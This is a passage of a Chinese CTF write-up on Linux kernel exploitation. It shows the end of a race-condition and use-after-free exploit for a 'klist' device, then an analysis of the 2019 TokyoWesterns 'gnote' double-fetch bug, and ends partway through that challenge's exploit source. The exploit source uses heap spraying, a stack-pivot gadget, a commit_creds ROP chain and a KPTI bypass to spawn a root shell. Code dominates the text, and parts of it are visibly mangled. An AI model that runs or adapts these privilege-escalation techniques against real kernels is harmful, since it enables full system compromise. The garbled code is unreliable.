        if(-1 == ioctl(fd, 0x1338, num)){
            ErrPro("Select");
        }
    }
    void Remove(size_t num){
        if(-1 == ioctl(fd, 0x1339, num)){
            ErrPro("Remove");
        }
    }
    void getHead(char* buf){
        if(-1 == ioctl(fd, 0x133A, buf)){
            ErrPro("getHead");
        }
    }
    int main(){
        int pid = 0;
        fd = open("/dev/klist", O_RDWR);
        if(fd ");
                            system("cat /flag");
                        }
                    }
                }
            }
            while(1){
                Add(0x280, bufA);   //creat chunk0 flag=1
                Select(0);          //put chunk0 into file_operations,flag+1=2
                Remove(0);          //flag-1
                Add(0x280, bufB);   //race condition, maybe change chunk0
                read(fd, buf, 0x500);
                if(buf[0] != 'a'){  //if chunk0 changed, race win
                    puts("child process race win");
                    break;
                }
                Remove(0);          //else, race continue
            }
            puts("Now pipe to heap spray");
            Remove(0);              //uaf point
            char buf3[0x500] = { 0 };
            memset(buf3, 'E', 0x500);
            int fds[2];
        //getchar();
            //利用pipe堆喷，分配到 uaf point and change its size
            pipe(&fds[0]);
            for(int i = 0; i = 2){
                        break;
                    }
                }
            }
        printf("pos: 0x%llx\n",pos*4);
            write(fd, buffer, pos*4);
            while(1){
                if(!getuid()){
                    puts("Root now=====>");
                    system("cat /flag");
                }
            }
        }
        else if(pid > 0){
            char buf4[0x500] = { 0 };
            memset(buf4, '\x00', 0x500);
            while(1){
                getHead(buf4);
                read(fd, buf4, 0x500);
                if(buf4[0] != 'a'){
                    puts("Parent process race won");
                    break;
                }
            }
            while(1){
                if(!getuid()){
                    puts("Root now=====>");
                    system("cat /flag");
                }
            }
        }
        else 
        {
            puts("fork failed");
            return -1;
        }
        return 0;
    }
## 2019-TokyoWesterns-gnote
###  漏洞分析
题目首先就给了源码，从源码中可以直接看出来就两个功能，一个是 `write`，使用了一个 `siwtch
case`结构，实现了两个功能，一是`kmalloc`申请堆块，一个是 `case 5`选择堆块。
    ssize_t gnote_write(struct file *filp, const char __user *buf, size_t count, loff_t *f_pos)
    {
      unsigned int index;
      mutex_lock(&lock);
      /*
       * 1. add note
       * 2. edit note
       * 3. delete note
       * 4. copy note
       * 5. select note
       * No implementation :(
       */
      switch(*(unsigned int *)buf){
        case 1:
          if(cnt >= MAX_NOTE){
            break;
          }
          notes[cnt].size = *((unsigned int *)buf+1);
          if(notes[cnt].size > 0x10000){
            break;
          }
          notes[cnt].contents = kmalloc(notes[cnt].size, GFP_KERNEL);
          cnt++;
          break;
        case 2:
          printk("Edit Not implemented\n");
          break;
        case 3:
          printk("Delete Not implemented\n");
          break;
        case 4:
          printk("Copy Not implemented\n");
          break;
        case 5:
          index = *((unsigned int *)buf+1);
          if(cnt > index){
            selected = index;
          }
          break;
      }
      mutex_unlock(&lock);
      return count;
    }
还有一个功能就是`read`，读取堆块中的数据。
    ssize_t gnote_read(struct file *filp, char __user *buf, size_t count, loff_t *f_pos)
    {
      mutex_lock(&lock);
      if(selected == -1){
        mutex_unlock(&lock);
        return 0;
      }
      if(count > notes[selected].size){
        count = notes[selected].size;
      }
      copy_to_user(buf, notes[selected].contents, count);
      selected = -1;
      mutex_unlock(&lock);
      return count;
    }
然后，虽然给了源码和汇编，看到最后也没发现有什么问题。猜测可能是条件竞争，但是常规的堆块也没有竞争的可能性。这题的漏洞出的十分隐蔽了，`write`功能中是通过
`switch case`实现跳转，在汇编中`switch case`是通过`swicth table`跳转表实现的，即看如下汇编：
    .text:0000000000000019                 cmp     dword ptr [rbx], 5 ; switch 6 cases
    .text:000000000000001C                 ja      short def_20    ; jumptable 0000000000000020 default case
    .text:000000000000001E                 mov     eax, [rbx]
    .text:0000000000000020                 mov     rax, ds:jpt_20[rax*8] ; switch jump
    .text:0000000000000028                 jmp     __x86_indirect_thunk_rax
会先判断 跳转id是否大于最大的跳转 路径 5，如果不大于再使用 `ds:jpt_20`这个跳转表来获得跳转的地址。这里可以看到这个 id，首先是从
`rbx`所在地址中的值与5比较，然后将`rbx`中的值复制给 `eax`，通过
`eax`来跳转。那么存在一种情况，当`[rbx]`与`5`比较通过后，有另一个进程修改了 `rbx`的值 将其改为了 一个大于跳转表的值，这里由于
rbx的值是用户态传入的参数，所以是能够被用户态所修改的。随后系统将`rbx`的值传给`eax`，此时`eax`大于`5`，即可实现 劫持控制流到一个
较大的地址。  
也即，这里存在一个 `double fetch`洞。
###  利用分析
**泄露地址**  
这里泄露地址的方法，感觉在真实漏洞中会用到，即利用 `tty_struct`中的指针来泄露地址。  
可以先打开一个 `ptmx`，然后 `close`掉。随后使用 `kmalloc`申请与
`tty_struct`大小相同的`slub`，这样就能将`tty_struct`结构体申请出来。然后利用 `read`函数读取其中的指针，来泄露地址。
**double-fetch堆喷**  
上面已经分析了可以利用 `double-fetch`来实现任意地址跳转。那么这里我们跳转到哪个地址呢，跳转后又该怎么执行呢？
这里我们首先选择的是用户态空间，因为这里只有用户态空间的内容是我们可控的，且未开启`smap`内核可以访问用户态数据。我们可以考虑在用户态通过堆喷布置大量的
`gadget`，使得内核态跳转时一定能落到`gadget`中。那么这里用户态空间选择什么地址呢？
这里首先分析 上面 `swicth_table`是怎么跳的，这里`jmp_table+(rax*8)`，当我们的`rax`输入为
`0x8000200`，假设内核基址为`0xffffffffc0000000`，则最终访问的地址将会溢出
`(0xffffffffc0000000+0x8000200*8 == 0x1000)`，那么最终内核最终将能够访问到 `0x1000`。
由于内核模块加载的最低地址是 `0xffffffffc0000000`，通常是基于这个地址有最多
`0x1000000`大小的浮动，所以这里我们的堆喷页面大小 肯定要大于 `0x1000000`，才能保证内核跳转一定能跳到 `gadget`
。而一般未开启 `pie`的用户态程序地址空间为 `0x400000`，如果我们选择低于`0x400000`的地址开始堆喷，那么最终肯定会对
用户态程序，动态库等造成覆盖。 所以这里我们最佳的地址是 `0x8000000`，我们的输入为：
`(0xffffffffc0000000+0x9000000*8 == 0x8000000)`
那么我们选择`0x8000000`地址，并堆喷 `0x1000000`大小的 gadget。那么这里应该选择何种 `gadget`呢？
这里的思路是最好确保内核态执行执行了 `gadget`后，能被我们劫持到位于用户态空间的的`ROP`上。这里选用的 `gadget`是 `xchg eax,
esp`，会将 `RAX`寄存器的 低 `4byte`切换进 `esp`寄存器，同时`rsp`拓展位的高`32`位清`0`，这样就切换到用户态的栈了。
然后我们的 `ROP`部署在哪个地址呢？这里需要根据`xchg eax,
esp`这个`gadget`的地址来计算，通过在`xchg_eax_rsp_r_addr & 0xfffff000`处开始分配空间，在
`xchg_eax_rsp_r_addr & 0xffffffff`处存放内核 ROP链，就可以通过 `ROP`提权。
然后这里 提权，需要注意开启了 KPTI保护，关于
KPTI保护及绕过方法可以参考[这篇文章](https://bbs.pediy.com/thread-258975.htm)。
###  EXP
    //$ gcc -O3 -pthread -static -g -masm=intel ./exp.c -o exp
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    size_t user_cs, user_ss, user_rflags, user_sp;
    size_t prepare_kernel =  0x69fe0;
    size_t commit_creds = 0x69df0;
    size_t p_rdi_r = 0x1c20d;
    size_t mv_rdi_rax_p_r = 0x21ca6a;
    size_t p_rcx_r = 0x37523;
    size_t p_r11_p_rbp_r = 0x1025c8;
    size_t kpti_ret = 0x600a4a;
    size_t iretq = 0x0;
    size_t modprobe_path = 0x0;
    size_t xchg_eax_rsp_r = 0x1992a;
    size_t xchg_cr3_sysret = 0x600116;
    int fd;
    int istriggered = 0;
    typedef struct Knote{
        unsigned int ch;
        unsigned int size;
    }gnote;
    void Err(char* buf){
        printf("%s Error\n");
        exit(-1);
    }
    void getshell(){
        if(!getuid()){
            system("/bin/sh");
        }
        else{
            err("Not root");
        }
    }
    void shell()
    {
        istriggered =1;
        puts("Get root");
      char *shell = "/bin/sh";
      char *args[] = {shell, NULL};
      execve(shell, args, NULL);
    }
    void getroot(){
        char* (*pkc)(int) = prepare_kernel;
        void (*cc)(char*) = commit_creds;
        (*cc)((*pkc)(0));
    }
    void savestatus(){
           __asm__("mov user_cs,cs;"
               "mov user_ss,ss;"
               "mov user_sp,rsp;"
               "pushf;"            //push eflags
               "pop user_rflags;"
              );
    }
    void Add(unsigned int sz){
        gnote gn;
        gn.ch = 1;
        gn.size = sz;
        if(-1 == write(fd, &gn, sizeof(gnote))){
            Err("Add");